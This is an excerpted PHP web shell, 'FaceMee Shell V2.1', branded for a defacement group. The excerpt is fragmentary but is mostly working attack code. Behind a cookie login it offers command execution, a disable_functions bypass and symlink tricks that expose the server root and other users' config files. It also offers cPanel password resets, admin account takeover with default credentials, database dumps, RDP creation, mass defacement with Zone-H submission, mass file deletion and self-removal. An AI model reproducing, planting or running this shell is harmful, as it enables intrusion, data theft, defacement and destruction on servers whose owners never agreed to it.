...
if(!empty($arif)) {
    if(isset($_GET['login']) && ($_GET['login']) == $arif)
        VEsetcookie(md5($_SERVER['HTTP_HOST']), $arif);

    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $arif))
        Login();
}
...
<title>FaceMee Shell V2.1 - '.$site.'</title>
...
<link rel="icon" href="https://4.top4top.net/p_129460x4i0.jpg" type="image/x-icon">
<link href="https://fonts.googleapis.com/css?family=Anton&display=swap" rel="stylesheet">
	<link href="https://fonts.googleapis.com/css?family=Black+Ops+One" rel="stylesheet">
	<link href="https://fonts.googleapis.com/css?family=Merienda" rel="stylesheet">
	<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
<link href="https://fonts.googleapis.com/css?family=Sedgwick+Ave+Display" rel="stylesheet">
<title>..:: [Stable version 2.1] ::..</title>
<meta property="og:image" content="https://1.top4top.net/p_1440z19ed0.jpg">
<meta name="description" content="[ Powered By ./Mr.p3mu14 ]" />
<style >
  .blink_text {
...
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?login='.$arif.'&path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?login='.$arif.'&path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
...
$path = str_replace('\\','/',$path,);
$paths = explode('/',$path);
echo "<hr><center class='arif_table'>
<a href='?' class='arif_table'>Home</a>
<a href='?path=$path&stuck=adminer&login=".$arif."' class='arif_table'>ADMINER</a>
<a href='?path=$path&stuck=csrf&login=".$arif."' class='arif_table'>Csrf</a>
<a href='?path=$path&stuck=autoeu&login=".$arif."' class='arif_table'>AUTO EDIT USER</a>
<a href='?path=$path&stuck=bypdisf&login=".$arif."' class='arif_table'>BYPASS DISFUNC</a>
<a href='?path=$path&stuck=cmd&login=".$arif."' class='arif_table'>COMMAND</a>
<a href='?path=$path&stuck=cpanel&login=".$arif."' class='arif_table'>CPANEL RESET PASS</a><hr color=#1E1E1E>
<a href='?path=$path&stuck=config&login=".$arif."' class='arif_table'>CONFIG</a>
<a href='?path=$path&stuck=rdp&login=".$arif."' class='arif_table'>CREATE RDP</a>
<a href='?path=$path&stuck=domains&login=".$arif."' class='arif_table'>DOMAINS</a>
<a href='?path=$path&stuck=dbdump&login=".$arif."' class='arif_table'>DB DUMP</a>
<a href='?path=$path&stuck=info&login=".$arif."' class='arif_table'>INFO</a>
<a href='?path=$path&stuck=jumping&login=".$arif."' class='arif_table'>JUMPING</a>
<a href='?path=$path&stuck=mass_deface&login=".$arif."' class='arif_table'>MASS DEFACE</a>
<a href='?path=$path&stuck=mass_delete&login=".$arif."' class='arif_table'>MASS DELETE</a><hr color=#1E1E1E>
<a href='?path=$path&stuck=sym&login=".$arif."' class='arif_table'>SYM</a>
<a href='?path=$path&stuck=sym403&login=".$arif."' class='arif_table'>SYM 403</a>
<a href='?path=$path&stuck=sym404&login=".$arif."' class='arif_table'>SYM 404</a>
<a href='?path=$path&stuck=smtp&login=".$arif."' class='arif_table'>SMTP</a>
<a href='?path=$path&stuck=upload&login=".$arif."' class='arif_table'>UPLOAD</a>
<a href='?path=$path&stuck=vhost&login=".$arif."' class='arif_table'>VHOST</a>
<a href='?path=$path&stuck=zoneh&login=".$arif."' class='arif_table'>ZONE-H</a>
<a href='?path=$path&stuck=killme&login=".$arif."' class='arif_table'>KILL YOUR SELF!</a>
<hr>";
if(isset($_GET['metu'])) {
    unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
    print "<script>window.location='?';</script>";
}
if($_GET['stuck'] == 'upload') {
...
} elseif($_GET['stuck'] == 'cmd') {
echo "<center><form method='post'><font>Command : </font>
<input class='arif_table' type='text' size='30' height='10' name='command'><input class='arif_table' type='submit' name='colmekdeh' value='>'></form>";
...
} elseif($_GET['stuck'] == 'zoneh') {if($_POST['submit']) {
echo '<center>';
		...
		echo "<center><form class='arif_table' method='post'>
		<font>Defacer : </font><br>
		<input style='margin-top:4px;width:400px;font-family:Kelly Slab;font-size:15;background:transparent;color:silver;border:2px solid silver; text-align: left;' type='text' name='nick' size='50' placeholder='Facemee'><br>
...
echo "</td></table></body>";
  ...
  <input class='arif_table' type='text' name='d_file' value='sx.php' style='width: 450px;' height='10'><br>
  <font>Index File :</font><br>
  <textarea class='arif_table' name='script' style='width: 450px; height: 200px;'>Hacked by StuckXploiter</textarea><br>
  <input class='arif_table' type='submit' name='start' value='Mass Deface' style='width: 450px;'>
  </form></center><br>";
	}
} elseif($_GET['stuck'] == 'mass_delete') {function mass_delete($dir,$namafile) {
if(is_writable($dir)) {
   $dira = scandir($dir);
   foreach($dira as $dirb) {
       $dirc = "$dir/$dirb";
   ...
   <input class='arif_table' type='submit' name='start' value='Mass Delete' style='width: 450px;'>
...
} elseif($_GET['stuck'] == 'vhost') {echo "<form method='POST' action=''>";
	...
	echo "<center><input type='submit' value='Bypass it' name='bypassxd' class='oke'></center>";
		if (isset($_POST['bypassxd'])){
                        mkdir('stuck_xploiter_vhost', 0755);
                        chdir('stuck_xploiter_vhost');
                        system('ln -s / stuck_xploiter');
			...
			$rt="<br><a href=stuck_xploiter_vhost/stuck_xploiter TARGET='_blank'><font size=3>Click Here!</font></a>";
...
} elseif($_GET['stuck'] == 'sym404') {echo '<center><form class="arif_table" enctype="multipart/form-data" method="post"><h2> Sym404 </h2><br>
<font>Target : </font><input class="arif_table" type="text" name="dir" placeholder="/home/user/public_html/namaconfig.php"><br>
<font>Save As : </font><input class="arif_table" type="text" name="save"><br><input name="bypass" type="submit" value="Bypass !!!"></form>';
if($_POST['bypass']) {
mkdir("stuck404_sym", 0777);
$dir = $_POST['dir'];
$save = $_POST['save'];
shell_exec("ln -s".$dir." stuck404_sym/".$save);
symlink($dir,"stuck404_sym/".$save);
$fopsym = fopen("stuck404_sym/.htaccess","w");
fwrite($fopsym,"ReadmeName ".$save);
fclose($fopsym);
echo '<a href="stuck404_sym/">Touch !!!</a><br></center>';}
} elseif($_GET['stuck'] == 'smtp') {
	...
	$smpt_hunter = scj($dir);
	echo $smpt_hunter;
} elseif($_GET['stuck'] == 'bypdisf') {echo "<center><br>";
...
SecFilterScanPOST Off
...
} elseif($_GET['stuck'] == 'autoeu') {if($_POST['hajar']) {
    ...
    <form class='arif_table'  method='post'>
    <input type='radio' class='arif_table' name='config_type' value='dir' checked>DIR Config<input type='radio' class='arif_table' name='config_type' value='link'>LINK Config<br>
    <input class='arif_table' type='text' size='50' name='config_dir' value='$path'><br><br>
    Username : <input type='text' class='arif_table' name='user_baru' value='StuckXploiter'><br>
    Password : <input type='text' class='arif_table' name='pass_baru' value='StuckXploiter'><br>
...
} elseif($_GET['stuck'] == 'dbdump') {
	echo '<hr><pre><center>';
echo '<form class="arif_table" action=?dbdump method=post>
Database Dump
...
} elseif($_GET['stuck'] == 'killme') {
	$fileini = $_SERVER['SCRIPT_FILENAME'];
rmdir('sx_sym');rmdir('home');rmdir('stuck_xploit_vhost');rmdir('sx_conf');unlink($fileini);
echo 'Byeee.... :(<br>Thanks for Using ';
} elseif ($_GET['stuck'] == 'csrf') {
	# code...
...
echo '<tr>
<td><img src="data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs="><a href="?path='.$path.'/'.$dir.'&login='.$arif.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
...
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'&login='.$arif.'">
...
echo '<br><center><br/>
<div id="copy">
<font face="Kelly Slab" color="white" style="text-shadow: 0 0 20px blue, 0 0 5px blue, 0 0 7px blue, 0 0 20px blue; font-weight:bold: blue; font-size:20px"><a > FaceMee</a></font> &copy; 2019-'.date(Y).'</center>
</body>
</html>';
function exe($cmd) { 	
